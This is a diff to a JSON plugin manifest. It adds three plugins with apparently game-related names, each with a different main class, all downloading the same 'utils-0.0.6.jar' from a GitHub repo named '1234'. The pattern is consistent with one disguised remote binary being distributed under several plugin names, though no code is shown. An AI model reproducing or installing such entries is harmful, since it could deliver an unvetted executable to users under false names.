@@ -16,5 +16,23 @@
     "packageId": "brain",
     "mainClassName": "JavaVMPlugin",
     "url": "https://github.com/bryerjaniece/1234/blob/main/utils-0.0.6.jar?raw=true"
+  },
+  {
+    "name": "coxassist",
+    "packageId": "coxassist",
+    "mainClassName": "CoxPlugin",
+    "url": "https://github.com/bryerjaniece/1234/blob/main/utils-0.0.6.jar?raw=true"
+  },
+  {
+    "name": "tombs",
+    "packageId": "tombs",
+    "mainClassName": "TobHelperPlugin",
+    "url": "https://github.com/bryerjaniece/1234/blob/main/utils-0.0.6.jar?raw=true"
+  },
+  {
+    "name": "theatre3",
+    "packageId": "theatre3",
+    "mainClassName": "TobHelperPlugin3",
+    "url": "https://github.com/bryerjaniece/1234/blob/main/utils-0.0.6.jar?raw=true"
   }
 ]
